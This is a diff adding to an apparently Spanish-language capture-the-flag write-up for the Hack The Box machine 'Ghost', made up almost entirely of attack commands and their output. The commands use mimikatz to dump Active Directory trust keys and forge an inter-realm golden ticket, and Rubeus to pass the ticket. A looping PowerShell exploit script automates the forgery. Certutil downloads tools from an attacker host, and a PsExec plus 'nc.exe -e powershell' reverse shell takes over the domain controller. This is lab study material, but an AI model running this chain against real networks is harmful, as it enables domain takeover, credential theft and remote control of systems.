@@ -1908,5 +1908,383 @@ CertUtil: -URLCache command completed successfully.
 
 
 
+otra pruba
 
 
+
+```
+C:\ProgramData>mk.exe "lsadump::trust /patch" exit
+mk.exe "lsadump::trust /patch" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::trust /patch
+
+Current domain: CORP.GHOST.HTB (GHOST-CORP / S-1-5-21-2034262909-2733679486-179904498)
+
+Domain: GHOST.HTB (GHOST / S-1-5-21-4084500788-938703357-3654145966)
+ [  In ] CORP.GHOST.HTB -> GHOST.HTB
+    * 2/7/2025 9:45:55 AM - CLEAR   - 75 85 47 04 86 07 63 03 f4 b5 a6 8f cb 64 a7 7a e5 30 5a 0c 90 5e 03 76 18 ce 79 c9 ce 47 d2 89 a4 55 02 64 6e be 3a c6 92 28 a6 76 4f d2 ea eb 25 72 82 c4 c8 e5 55 55 7b 29 b0 d3 a0 fc 9a 1b 3d c7 98 a3 1d 25 05 49 39 de 68 35 b4 ef e1 38 fa 81 70 0c 51 ad d1 6a 38 a4 5e e0 cf 61 15 98 2a eb d6 3c 5f 18 fa 2e 69 58 7c 9b 25 d6 5d 32 1d f9 c1 5b c4 76 f2 06 0a 46 44 fa 6e 24 a1 84 a8 89 c4 11 eb 75 5b b8 67 64 74 fa 45 ef 4d 60 4d 2d 75 20 35 cb 68 89 ee 2e ee 40 30 5c 3d 7c cc a3 cf fa 66 a0 71 d4 67 eb 9e b2 43 e9 61 d5 68 73 d7 45 9d a9 8d b8 07 6b f0 08 87 14 77 b0 c9 d9 51 7e 43 c3 12 1e a9 d3 8c 7d d0 68 a8 d0 70 8a c0 01 a9 43 43 62 c4 db bd 8f 4b 6d 30 3f 24 9d 66 4c 69 ff 5e 11 36 88 5f 0b aa d2 ee 13 
+	* aes256_hmac       2ebffec8e7479bcd49756acc82db80671cfffcac207232d65b2052c60dfb1bf7
+	* aes128_hmac       7a23ca1cb52263c5cae9baf7a0f09e42
+	* rc4_hmac_nt       6d6f0fb56ad234f6b85ae8be3ae6e2a3
+
+ [ Out ] GHOST.HTB -> CORP.GHOST.HTB
+    * 2/7/2025 9:45:13 AM - CLEAR   - 20 d1 cb e4 cf 41 b8 3a a2 bd 83 13 a7 e8 79 07 64 37 29 e5 45 1e 15 98 04 03 40 16 f0 c8 5a 73 f2 7e 09 31 47 48 11 29 40 73 5f 01 80 2c 9b 2d a4 d6 ed 42 00 aa c1 0e fd 18 d0 71 b9 ce f6 60 2b 54 b0 96 ac ad d4 6c 13 c1 cd 09 68 60 85 dc bc 45 a1 2a 75 49 d4 8b 53 aa 72 c3 71 7b c5 f5 e8 52 07 68 52 17 e0 8d c9 cc 16 64 e5 9b b5 7f ee 92 49 af fc df bd 69 14 a8 3b c6 71 ba 25 66 f0 fd 05 4d 3c 01 74 e2 86 d1 b3 3c 41 51 1d 77 6a 7e 47 4e 6a f8 16 a8 0f d1 a2 06 51 5e 78 e1 fb 81 b6 fd d9 0d ae c0 c8 dd b1 42 b5 2b ec 34 dd dc 39 dc ea 8d 90 3c d7 d3 5b fd 2f 73 4b 1c e7 c3 55 93 79 ed 06 e5 1c 92 67 1b 75 7a 27 27 75 b0 b2 00 c4 18 e5 a9 c9 01 9f 33 7c f1 bf 03 a5 ce 10 2c cc cc a3 2b d6 8b 2b 88 e4 c9 6d d2 
+	* aes256_hmac       eb67c47eb93e1e6713b7a891e333e4e57f020a494e1f638ef226adb7023cfdd4
+	* aes128_hmac       98a5cbb5490bf6d30a0f9b615ed15674
+	* rc4_hmac_nt       be0a51897087a382ca0726b2403e6b00
+
+ [ In-1] CORP.GHOST.HTB -> GHOST.HTB
+    * 7/22/2024 8:21:26 AM - CLEAR   - de 0b 64 63 58 9d ed e1 bc 36 c0 50 7c 4d 41 6d bd 82 72 e9 98 9b 13 58 b8 68 f1 94 8c ca 12 50 9b af 45 7d 0a 4d 4e 40 e2 7d 12 59 72 2f 87 22 64 c8 fa b2 96 8d aa c1 f1 17 a3 e7 aa 2b ec 87 b5 59 57 71 6f 33 87 4c e0 8a 8b 03 38 a2 71 b6 d5 0b 61 fd 7e 14 3e 46 16 d9 29 d8 f6 f9 05 69 3f b7 4f c1 28 0b 7e ec e5 46 ab 7e e8 2c 8b be 70 b5 d9 6c 96 1b fb 56 33 bc 41 15 b5 73 42 25 54 15 4b b6 fc 55 07 81 60 4a 6b 4c 22 a2 55 61 e5 91 e6 75 e3 62 d4 9a 37 77 bd 63 90 8e 6a 2a 2c c6 88 8f 57 44 7a 9e 35 aa e5 6a 2b 5f c8 0a 8c 4f cb bd af c9 60 59 ff 15 d9 fd cf 27 93 9f f7 19 9e 91 2b 38 d7 0e ec c9 43 e6 8c 3b 60 02 5f b7 c3 c1 67 c2 6b 44 db 1f 9c f7 72 2f 3a 54 6e 62 02 c9 46 d1 b7 3d 26 54 d0 4f 35 65 a8 3f 
+	* aes256_hmac       de2e49c70945c0cb0dec99c93587de84f0b048843b8e295c6da720ba85545ffe
+	* aes128_hmac       b55ca148bc95f95b8cb72f67661e1a08
+	* rc4_hmac_nt       0b0124f5d6c07ad530d6bf6a6404fdaa
+
+ [Out-1] GHOST.HTB -> CORP.GHOST.HTB
+    * 2/7/2025 9:45:13 AM - CLEAR   - 78 10 13 24 91 0a 57 22 71 4e f6 ef 53 6a d8 54 02 97 63 0b 78 28 41 b7 5e 5e e6 b7 50 03 35 96 f2 e5 8b a3 c1 21 fa f6 01 f5 5f 7b 38 98 bc 8b 2b f5 3e 91 ce 8a 01 06 59 c0 9b 19 8c d8 d3 1a 17 9f d4 f1 b2 cb a0 49 f6 7f 97 f7 a0 79 63 bb 20 4a bf a3 d9 dd b1 13 20 c6 a0 84 a2 ea 65 79 6a b6 d3 db 17 e9 be b8 c1 35 57 38 c8 3b a6 6a 90 32 66 ba 0e bd fd 67 bf f4 e9 3c f2 e5 37 94 84 d6 c0 71 d3 42 85 ef 4e 94 ac 56 0f df 05 77 1b 74 57 4f a2 07 07 a1 d6 8e ee a1 cd 6a c0 4c d9 3f 16 0a fa 47 07 45 45 ad b5 6d e4 01 b1 e4 bf 76 c2 8e 5b 4e f4 04 ed 08 e4 e0 7e d8 18 5a f5 df 07 c3 97 3d 7e 6d 28 1e c1 1a ec 6d 06 83 0f 27 ea c8 00 af 92 c9 1f f6 50 45 f5 c1 bb 4a 09 bb d6 df 6b cf d6 fe fe d8 44 bb 19 90 46 0b 
+	* aes256_hmac       b50449e019e0a55f9227fb2e830b044e9e9ad9952e2249e5de29f2027cd8f40d
+	* aes128_hmac       81f4c2f21a640eed29861d71a619b4bb
+	* rc4_hmac_nt       ea4e9954536eb29091fc96bbce83be23
+
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (326).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```
+C:\ProgramData>mk.exe "kerberos::golden /user:Administrator /domain:corp.ghost.htb /rc4:6d6f0fb56ad234f6b85ae8be3ae6e2a3 /sid:S-1-5-21-2034262909-2733679486-179904498 S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /service:krbtgt /ticket:administrator.kirbi" exit
+mk.exe "kerberos::golden /user:Administrator /domain:corp.ghost.htb /rc4:6d6f0fb56ad234f6b85ae8be3ae6e2a3 /sid:S-1-5-21-2034262909-2733679486-179904498 S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /service:krbtgt /ticket:administrator.kirbi" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # kerberos::golden /user:Administrator /domain:corp.ghost.htb /rc4:6d6f0fb56ad234f6b85ae8be3ae6e2a3 /sid:S-1-5-21-2034262909-2733679486-179904498 S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /service:krbtgt /ticket:administrator.kirbi
+User      : Administrator
+Domain    : corp.ghost.htb (CORP)
+SID       : S-1-5-21-2034262909-2733679486-179904498
+User Id   : 500
+Groups Id : *513 512 520 518 519 
+ServiceKey: 6d6f0fb56ad234f6b85ae8be3ae6e2a3 - rc4_hmac_nt      
+Service   : krbtgt
+Target    : ghost.htb
+Lifetime  : 2/7/2025 6:15:48 PM ; 2/5/2035 6:15:48 PM ; 2/5/2035 6:15:48 PM
+-> Ticket : administrator.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+mimikatz(commandline) # exit
+Bye!
+
+```
+
+
+
+```powershell
+C:\ProgramData>Rubeus.exe asktgs /dc:dc01.ghost.htb /service:cifs/dc01.ghost.htb /ticket:administrator.kirbi /nowrap /ptt
+Rubeus.exe asktgs /dc:dc01.ghost.htb /service:cifs/dc01.ghost.htb /ticket:administrator.kirbi /nowrap /ptt
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'cifs/dc01.ghost.htb'
+[*] Using domain controller: dc01.ghost.htb (10.0.0.254)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIEqjCCBKagAwIBBaEDAgEWooIDqzCCA6dhggOjMIIDn6ADAgEFoQsbCUdIT1NULkhUQqIhMB+gAwIBAqEYMBYbBGNpZnMbDmRjMDEuZ2hvc3QuaHRio4IDZjCCA2KgAwIBEqEDAgEEooIDVASCA1D8P/LOkCpz6xC+IYry09nSmlLeSbq5V7JWv50pNznNaBoh1J5D9dPKM2m49bK/MrP6Rvy9ps66G2BgMHnCnvs8aARRJqmVGMF8MkX6ec5MZ7jWIdTzcy7B1CZFB89SYNIJXYt5DHXlCrJLslKFSoMgcUjvG+trMzifNZfOhBPEYeVUbtVGSAT93e/5ffQeCHdrXYc5muwsDBPP3lh/xHwVCO3bRVqb/JpER5KedgGvdb4+EcrtnzjnIQIOEhhX7LYZ8KZM+FsMypUZYr3RInJc1yBAIbOPKQ3/Bwxz5WfmH8ICyybz6M8VI0+fFBQ1ko/Hu5EfHrHLjdcJAEH2PgUAfSKDLoEouUz9PP7vkAdoTJ9mqi0w6R4Rz0HSXK87dN6gO/NDejtEq8Rh3R2DiFI9e1vUuhqtk49I6o8KNLs8V7bSH3BCbHtNCaWasjDedSIr2d0/seNdTM1uaI7WFvcCbtOG6WsPNI3NKxs/w6O0Wyv2tjMqA/Ydp3+wexdYU0TOUpIJY8XfnEnsBlUYwWaYIbMwrFA7mcKnQVgrpdmV0ZNTNei3n09GKNbgx/1Wo/5eK6ewLJ904o5OU+OWpLbH+nAAO6X3N+/TY1BhdZK0AC1oNCUuwbHcq6iLfGzKw7vdTrmVdHIU1IsODZBgwqFm8mk8+CD2wtH4w2TMv9gs5gDwxbfrTaICe0OS6udyKHwofzNWpsKpDqG/WSgct18bO0cc+AF3dIt3nM7C1i0TnnCtn48wVpIJNZFptE2PSynQvn0gd6ci8Uq0VtscLNBR24ergdXrqdc7Bbr/BBaxVxikv/FjGo5jh0c4ygcL2B2wpqUjJzP4wK7JRcSvRM6E2knSY0+cewv4knGjnnon3q/te1ee2uiASFZ0gRBMt1KCbrnHdbA2m2jf/GSnIaHkIJf+ia2DPrOnYKqRQBJDn2gm7nkep+jdkqYWnIMLSD0av29NGB/sRcd8bt8c0oho3xHvfYwwEmNDbkbZgJxNtMfvfZ2zYRrkL8vhWg7scTLqtd5FgJPYtfRA2EFhCwK9BaXhvvh70dwqsjfRRxOQWDnPoRPe+c9/awl3iyMbTkb0bLsal7M7Jy9f3Imtyc7iFHS+dZ4XnjqOF34Em3SJa6OB6jCB56ADAgEAooHfBIHcfYHZMIHWoIHTMIHQMIHNoCswKaADAgESoSIEIFwo093UuuE6f87W2Cu/YZpafwX1aFthHdmMJqJDkjFioRAbDmNvcnAuZ2hvc3QuaHRiohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDI1MDIwODAyMTczOFqmERgPMjAyNTAyMDgxMjE3MzhapxEYDzIwMjUwMjE1MDIxNzM4WqgLGwlHSE9TVC5IVEKpITAfoAMCAQKhGDAWGwRjaWZzGw5kYzAxLmdob3N0Lmh0Yg==
+
+  ServiceName              :  cifs/dc01.ghost.htb
+  ServiceRealm             :  GHOST.HTB
+  UserName                 :  Administrator
+  UserRealm                :  corp.ghost.htb
+  StartTime                :  2/7/2025 6:17:38 PM
+  EndTime                  :  2/8/2025 4:17:38 AM
+  RenewTill                :  2/14/2025 6:17:38 PM
+  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  XCjT3dS64Tp/ztbYK79hmlp/BfVoW2Ed2YwmokOSMWI=
+```
+
+
+
+
+
+```powershell
+PS C:\ProgramData> klist
+klist
+
+Current LogonId is 0:0x3e7
+
+Cached Tickets: (1)
+
+#0>	Client: Administrator @ corp.ghost.htb
+	Server: cifs/dc01.ghost.htb @ GHOST.HTB
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
+	Start Time: 2/7/2025 18:17:38 (local)
+	End Time:   2/8/2025 4:17:38 (local)
+	Renew Time: 2/14/2025 18:17:38 (local)
+	Session Key Type: AES-256-CTS-HMAC-SHA1-96
+	Cache Flags: 0 
+	Kdc Called: 
+```
+
+
+
+```powershell
+PS C:\ProgramData> dir \\dc01.ghost.htb\c$
+dir \\dc01.ghost.htb\c$
+dir : Access is denied
+At line:1 char:1
++ dir \\dc01.ghost.htb\c$
++ ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\dc01.ghost.htb\c$:String) [Get-ChildItem], UnauthorizedAccessExcept 
+   ion
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+ 
+dir : Cannot find path '\\dc01.ghost.htb\c$' because it does not exist.
+At line:1 char:1
++ dir \\dc01.ghost.htb\c$
++ ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (\\dc01.ghost.htb\c$:String) [Get-ChildItem], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+ 
+```
+
+
+
+```powershell
+# Definir las rutas de los ejecutables de Mimikatz y Rubeus
+$mimikatzPath = ".\mk.exe"
+$rubeusPath = ".\Rubeus.exe"
+
+# Definir los comandos de Mimikatz y Rubeus
+$mimikatzTrustCmd = '"lsadump::trust /patch" exit'  
+# Extrae información de relaciones de confianza en Active Directory
+$mimikatzGoldenCmd = '"kerberos::golden /user:Administrator /domain:corp.ghost.htb /rc4:6d6f0fb56ad234f6b85ae8be3ae6e2a3 /sid:S-1-5-21-2034262909-2733679486-179904498 S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /service:krbtgt /ticket:gzzcoo.kirbi" exit'
+# Genera un Golden Ticket con los datos del usuario Administrator
+$rubeusCmd = "/ticket:gzzcoo.kirbi /dc:dc01.ghost.htb /service:cifs/dc01.ghost.htb /nowrap /ptt"
+# Usa Rubeus para pedir un TGS y aplicarlo en memoria
+# Definir el directorio al que se intentará acceder
+$targetDirectory = "\\dc01.ghost.htb\c$"
+
+# Función para ejecutar un comando y esperar a que termine
+function Run-Command {
+    param (
+        [string]$cmd
+    )
+    & cmd /c $cmd | Out-Null
+}
+
+# Bucle que seguirá intentando hasta obtener acceso
+while ($true) {
+    try {
+        # Ejecutar Mimikatz para obtener información de trusts y generar el Golden Ticket
+        Run-Command "$mimikatzPath $mimikatzTrustCmd"
+        Run-Command "$mimikatzPath $mimikatzGoldenCmd"
+
+        # Ejecutar Rubeus para solicitar un TGS y aplicar el ticket en memoria
+        Run-Command "$rubeusPath asktgs $rubeusCmd"
+
+        # Verificar si se tiene acceso al directorio
+        $access = Test-Path $targetDirectory
+        if ($access) {
+            Write-Host "Acceso concedido a $targetDirectory"
+            dir $targetDirectory
+            break
+        } else {
+            Write-Host "Acceso denegado. Purgando tickets y reintentando..."
+            klist purge
+        }
+    } catch {
+        Write-Host "Ocurrió un error: $_"
+        klist purge
+    }
+}
+```
+
+
+
+```
+❯ ls -l exploit.ps1
+.rw-rw-r-- kali kali 1.8 KB Sat Feb  8 03:30:24 2025  exploit.ps1
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+
+
+```
+PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/exploit.ps1 exploit.ps1
+certutil.exe -f -urlcache -split http://10.10.16.7/exploit.ps1 exploit.ps1
+****  Online  ****
+  0000  ...
+  0759
+CertUtil: -URLCache command completed successfully.
+```
+
+
+
+```bash
+PS C:\ProgramData> .\exploit.ps1
+.\exploit.ps1
+Access granted to \\dc01.ghost.htb\c$
+
+
+    Directory: \\dc01.ghost.htb\c$
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----          5/8/2021   1:20 AM                PerfLogs                                                             
+d-r---         7/22/2024   9:55 AM                Program Files                                                        
+d-----         7/22/2024   9:55 AM                Program Files (x86)                                                  
+d-r---          2/4/2024   1:48 PM                Users                                                                
+d-----         7/10/2024   3:08 AM                Windows   
+```
+
+
+
+```powershell
+PS C:\ProgramData> copy nc.exe \\dc01.ghost.htb\c$\ProgramData
+copy nc.exe \\dc01.ghost.htb\c$\windows\ProgramData
+PS C:\ProgramData> dir \\DC01.ghost.htb\C$\ProgramData
+dir \\DC01.ghost.htb\C$\ProgramData
+
+
+    Directory: \\DC01.ghost.htb\C$\ProgramData
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d---s-         7/22/2024   9:55 AM                Microsoft                                                            
+d-----         7/22/2024   9:55 AM                Package Cache                                                        
+d-----         1/30/2024   7:09 PM                Packages                                                             
+d-----         1/30/2024   7:19 PM                regid.1991-06.com.microsoft                                          
+d-----          5/8/2021   1:20 AM                SoftwareDistribution                                                 
+d-----          5/8/2021   2:36 AM                ssh                                                                  
+d-----         1/30/2024   9:24 AM                USOPrivate                                                           
+d-----          5/8/2021   1:20 AM                USOShared                                                            
+d-----         1/30/2024   9:21 AM                VMware                                                               
+-a----          2/7/2025  12:50 PM          30208 ADFSDump.exe                                                         
+-a----          2/7/2025   6:51 PM          28160 nc.exe    
+```
+
+
+
+```
+PS C:\ProgramData> cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
+cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
+9aa9bfa25a6aa3ef5e12ae399ac93d51// Some code
+```
+
+
+
+```
+❯ ls -l PsExec64.exe
+.rw-rw-r-- kali kali 814 KB Tue Apr 11 18:10:26 2023  PsExec64.exe
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+```
+PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/PsExec64.exe PsExec64.exe
+certutil.exe -f -urlcache -split http://10.10.16.7/PsExec64.exe PsExec64.exe
+****  Online  ****
+  000000  ...
+  0cb7c0
+CertUtil: -URLCache command completed successfully.
+```
+
+
+
+```
+❯ rlwrap -cAr nc -nlvp 446
+listening on [any] 443 ...
+```
+
+
+
+```
+PS C:\ProgramData> .\PsExec64.exe -acepteula \\DC01.ghost.htb cmd.exe /c "C:\ProgramData\nc.exe -e powershell 10.10.16.7 4444"
+.\PsExec64.exe -acepteula \\DC01.ghost.htb cmd.exe /c "C:\ProgramData\nc.exe -e powershell 10.10.16.7 4444"
+
+PsExec v2.43 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Starting cmd.exe on DC01.ghost.htb...1.ghost.htb...
+```
+
+
+
+```
+❯ rlwrap -cAr nc -nlvp 446
+listening on [any] 446 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.11.24] 49826
+Microsoft Windows [Version 10.0.20348.2582]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\ProgramData>whoami
+whoami
+nt authority\system
+```
+
+
+
+```bash
+❯ rlwrap -cAr nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.11.24] 62725
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+corp\administrator
+PS C:\Windows\system32> hostname
+hostname
+DC01
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+9aa9bfa25a6aa3ef5e12ae399ac93d51
+PS C:\Windows\system32> 
+```
